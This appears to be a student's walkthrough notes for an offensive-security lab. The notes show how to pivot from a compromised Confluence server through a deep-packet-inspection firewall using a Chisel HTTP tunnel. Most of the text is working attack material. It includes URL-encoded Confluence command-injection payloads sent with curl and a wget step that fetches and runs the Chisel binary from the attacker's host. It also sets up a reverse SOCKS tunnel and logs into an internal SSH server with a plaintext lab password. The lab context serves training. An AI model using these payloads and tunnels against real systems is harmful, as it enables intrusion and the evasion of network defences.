@@ -1,0 +1,82 @@
+Background: We have compromised CONFLUENCE01, and can execute commands via HTTP requests. However, once we try to pivot, we are blocked by a considerably restrictive network configuration. Specifically, a Deep Packet Inspection (DPI) solution is now terminating all outbound traffic except HTTP. In addition, all inbound ports on CONFLUENCE01 are blocked except TCP/8090. We can't rely on a normal reverse shell as it would not conform to the HTTP format and would be terminated at the network perimeter by the DPI solution. We also can't create an SSH remote port forward for the same reason. The only traffic that will reach our Kali machine is HTTP, so we could, for example, make requests with Wget and cURL.
+
+# Chisel, an HTTP tunneling tool that encapsulates our data stream within HTTP. It also uses the SSH protocol within the tunnel so our data will be encrypted. Chisel uses a client/server model. A Chisel server must be set up, which can accept a connection from the Chisel client. Various port forwarding options are available depending on the server and client configurations. One option that is particularly useful for us is reverse port forwarding, which is similar to SSH remote port forwarding. We will run a Chisel server on our Kali machine, which will accept a connection from a Chisel client running on CONFLUENCE01. Chisel will bind a SOCKS proxy port on the Kali machine. The Chisel server will encapsulate whatever we send through the SOCKS port and push it through the HTTP tunnel, SSH-encrypted. The Chisel client will then decapsulate it and push it wherever it is addressed.
+
+# The traffic between the Chisel client and server is all HTTP-formatted. This means we can traverse the deep packet inspection solution regardless of the contents of each HTTP packet. The Chisel server on our Kali machine will listen on TCP port 1080, a SOCKS proxy port. All traffic sent to that port will be passed back up the HTTP tunnel to the Chisel client, where it will be forwarded wherever it's addressed.
+
+Questions 1
+Start VM Group 1. Follow the steps in this section, and set up Chisel as a reverse SOCKS proxy. SSH into PGDATABASE01 and retrieve the flag from /tmp/chisel_flag.
+
+# for Chisel to be transfer over to CONFLUENCE01
+python3 -m http.server 80 
+
+# Next, we will build the wget command we want to run through the injection on CONFLUENCE01. This command will download the chisel binary to /tmp/chisel and make it executable:
+wget 192.168.45.237/chisel -O /tmp/chisel && chmod +x /tmp/chisel
+
+# Encoded into url curl and push to CONFLUENCE01
+curl -v http://192.168.180.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.237/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
+...
+192.168.180.63 - - [05/May/2024 07:14:27] "GET /chisel HTTP/1.1" 200 -
+...
+
+# Now host the Chisel server and listen to the 8080 port
+chisel server --port 8080 --reverse
+
+# Before run the Chisel client, we can tcpdump on KALI to log incoming traffic. 
+sudo tcpdump -nvvvXi tun0 tcp port 8080
+
+# Now we will use Chisel clinet using the injection with curl as well
+# We want to connect to the server running on our Kali machine (192.168.45.237:8080), creating a reverse SOCKS tunnel (R:socks). The R prefix specifies a reverse tunnel using a socks proxy (which is bound to port 1080 by default). The remaining shell redirections (> /dev/null 2>&1 &) force the process to run in the background, so our injection does not hang waiting for the process to finish.
+/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
+
+# Encoded into url curl
+curl -v http://192.168.180.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.237:8080%20R:socks%27%29.start%28%29%22%29%7D/
+
+# Troubleshoot
+...
+2024/05/05 07:17:46 server: session#1: Client version (1.7.3) differs from server version (1.9.1-0kali1)
+...
+# Lets get a workable versions of chisel
+wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
+gunzip chisel_1.8.1_linux_amd64.gz
+chmod 755 chisel
+./chisel --help
+Version: 1.8.1 (go1.19.4)
+#
+
+# Inject the new Chisel by overwrite to CONFLUENCE01
+curl http://192.168.180.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.237/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
+
+curl http://192.168.180.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.237:8080%20R:socks%27%29.start%28%29%22%29%7D/
+
+# Check the tcpdump
+...
+GET / HTTP/1.1
+        Host: 192.168.45.237:8080
+        User-Agent: Go-http-client/1.1
+        Connection: Upgrade
+        Sec-WebSocket-Key: QhLaVKqIPidk6SlXYK8mGw==
+        Sec-WebSocket-Protocol: chisel-v3
+        Sec-WebSocket-Version: 13
+        Upgrade: websocket
+...
+
+# Check Chisel server
+...
+2024/05/05 07:49:13 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+...
+ss -tulpn
+tcp    LISTEN  0       4096          127.0.0.1:1080          0.0.0.0:*
+# Our SOCKS proxy port 1080 is listening on the loopback interface of our Kali machine.
+
+# Let's use this to connect to the SSH server on PGDATABASE01
+# SSH doesn't offer a generic SOCKS proxy command-line option. Instead, it offers the ProxyCommand9 configuration option. We can either write this into a configuration file, or pass it as part of the command line with -o. ProxyCommand accepts a shell command that is used to open a proxy-enabled channel. The documentation suggests using the OpenBSD version of Netcat, which exposes the -X flag and can connect to a SOCKS or HTTP proxy. However, the version of Netcat that ships with Kali doesn't support proxying.
+
+# Instead, we'll use Ncat the Netcat alternative written by the maintainers of Nmap. We can install this on Kali with sudo apt install ncat.
+# Now we'll pass an Ncat command to ProxyCommand. The command we construct tells Ncat to use the socks5 protocol and the proxy socket at 127.0.0.1:1080. The %h and %p tokens represent the SSH command host and port values, which SSH will fill in before running the command.
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.180.215 
+password: sqlpass123
+
+# Now we gain the ssh 
+database_admin@pgdatabase01:/tmp$ cat chisel_flag 
+OS{d05a3a6cde622d9326dfecfd3d516905}
